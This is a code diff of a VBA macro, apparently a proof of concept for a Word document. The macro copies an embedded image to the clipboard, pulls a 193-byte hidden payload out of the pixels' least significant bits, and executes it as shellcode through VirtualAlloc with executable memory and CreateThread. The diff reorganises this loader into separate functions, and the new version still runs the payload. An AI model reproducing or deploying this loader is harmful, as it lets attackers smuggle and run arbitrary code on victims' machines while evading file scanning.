@@ -1,5 +1,4 @@
 'I am slowly loosing my mental health here
-'TODO: make x64 working
 
 Private Declare Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Integer) As Long
 
@@ -34,35 +33,22 @@ Const MEM_RESERVE = &H2000
 Const MEM_COMMIT = &H1000
 Const PAGE_EXECUTE_READWRITE = &H40
 
-Sub poc()
- ActiveDocument.InlineShapes(1).Range.CopyAsPicture
 
- Dim lAvailable As Long, lResult As Long
- lAvailable = IsClipboardFormatAvailable(CF_BITMAP)
- If lAvailable <> 0 Then
-    Dim hKeyboard As Long, hPtr As Long, hBitmap As Long, Bmp As BITMAP
-    
-    hKeyboard = OpenClipboard(0&)
-    hPtr = GetClipboardData(CF_BITMAP)
-    hBitmap = CopyImage(hPtr, IMAGE_BITMAP, 0, 0, LR_COPYRETURNORG Or LR_CREATEDIBSECTION)
-    hKeyboard = CloseClipboard
+Private Function GetLsb(ByVal Target As Byte, ByVal Source As Byte) As Byte
+    GetLsb = (Target * 2) Or (Source And 1)
+End Function
 
-    Dim lBmBitsSize As Long
-    lResult = GetObjectA(hBitmap, Len(Bmp), Bmp)
-
+Private Function Read(Bmp As BITMAP, lPayloadSize As Long) As Byte()
     Dim lRowLength As Long, bBmBitsArr() As Byte
-    
     'Bitmap contained in clipboard is actually 32bit RGBA
     'No padding required at the end of the row
-    
     lRowLength = Bmp.bmWidth * 4
     lBmBitsSize = (lRowLength) * (Bmp.bmHeight)
     ReDim bBmBitsArr(lBmBitsSize)
 
     RtlMoveMemory VarPtr(bBmBitsArr(0)), Bmp.bmBits, lBmBitsSize
 
-    Dim lPayloadSize As Long, lBitLength As Long, bPayloadArr() As Byte
-    lPayloadSize = 193
+    Dim lBitLength As Long, bPayloadArr() As Byte
     lBitLength = lPayloadSize * 8
     ReDim bPayloadArr(lPayloadSize)
 
@@ -86,8 +72,8 @@ Sub poc()
                 If lBitLength <= 0 Then
                     bPayloadArr(lBytePos) = 0
                     
-                    Run VarPtr(bPayloadArr(0)), lPayloadSize
-                    Exit Sub
+                    Read = bPayloadArr
+                    Exit Function
                 End If
                 
                 bPayloadArr(lBytePos) = GetLsb(bPayloadArr(lBytePos), bChannelsArr(k))
@@ -97,16 +83,9 @@ Sub poc()
         Next x
         lYOffset = lYOffset - lRowLength
     Next y
- End If
-End Sub
-
-
-Private Function GetLsb(ByVal Target As Byte, ByVal Source As Byte) As Byte
-   GetLsb = (Target * 2) Or (Source And 1)
 End Function
 
-
-Sub Run(ByVal lPayloadAddr As Long, ByVal lPayloadSize As Long)
+Private Sub Run(ByVal lPayloadAddr As Long, ByVal lPayloadSize As Long)
     Dim lpMemPtr As Long, lResult As Long
     lpMemPtr = VirtualAlloc(0&, lPayloadSize, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     
@@ -114,4 +93,29 @@ Sub Run(ByVal lPayloadAddr As Long, ByVal lPayloadSize As Long)
     lResult = CreateThread(0&, 0&, lpMemPtr, 0&, 0&, 0&)
 End Sub
 
+Private Sub poc()
+    ActiveDocument.InlineShapes(1).Range.CopyAsPicture
 
+    Dim lAvailable As Long, lResult As Long
+    lAvailable = IsClipboardFormatAvailable(CF_BITMAP)
+
+    If lAvailable <> 0 Then
+        Dim hKeyboard As Long, hPtr As Long, hBitmap As Long, Bmp As BITMAP
+        
+        hKeyboard = OpenClipboard(0&)
+        hPtr = GetClipboardData(CF_BITMAP)
+        hBitmap = CopyImage(hPtr, IMAGE_BITMAP, 0, 0, LR_COPYRETURNORG Or LR_CREATEDIBSECTION)
+        hKeyboard = CloseClipboard
+
+        Dim lBmBitsSize As Long
+        lResult = GetObjectA(hBitmap, Len(Bmp), Bmp)
+
+        
+        Dim lPayloadSize As Long
+        lPayloadSize = 193
+        
+        bPayloadArr = Read(Bmp, lPayloadSize)
+
+        Run VarPtr(bPayloadArr(0)), lPayloadSize  
+    End If
+End Sub
